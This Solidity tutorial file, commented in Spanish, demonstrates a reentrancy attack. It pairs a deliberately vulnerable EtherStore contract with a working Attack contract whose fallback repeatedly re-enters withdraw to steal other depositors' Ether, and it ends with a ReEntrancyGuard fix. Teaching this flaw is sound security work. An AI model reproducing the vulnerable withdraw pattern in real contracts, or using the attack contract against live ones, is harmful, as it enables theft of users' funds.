// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
EtherStore es un contrato en el que puede depositar y retirar ETH.
Este contrato es vulnerable al ataque de reentrada.
Veamos por qué.

1. Deploy EtherStore
2. Deposite 1 Ether  de la Cuenta 1 (Alice) y la Cuenta 2 (Bob) en EtherStore
3. Deploy Attack con la dirección de EtherStore
4. Llamar a Attack.attack enviando 1 ether (usando la Cuenta 3 (Eve)).
    Recuperarás 3 Ethers (2 Ether robados a Alice y Bob,
    más 1 Ether enviado desde este contrato).

¿Qué sucedió?
Attack pudo llamar a EtherStore.withdraw varias veces antes
EtherStore.withdraw terminó de ejecutarse.

Así es como se llamaron las funciones
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (recibe 1 Ether)
- EtherStore.withdraw
- Attack.fallback (recibe 1 Ether)
- EtherStore.withdraw
- Attack fallback (recibe 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback se llama cuando EtherStore envía Ether a este contrato.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


/*
Técnicas preventivas
Asegúrese de que todos los cambios de estado ocurran antes de llamar a contratos externos
Utilice modificadores de función que eviten el reingreso
Aquí hay un ejemplo de un guardia de reingreso
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}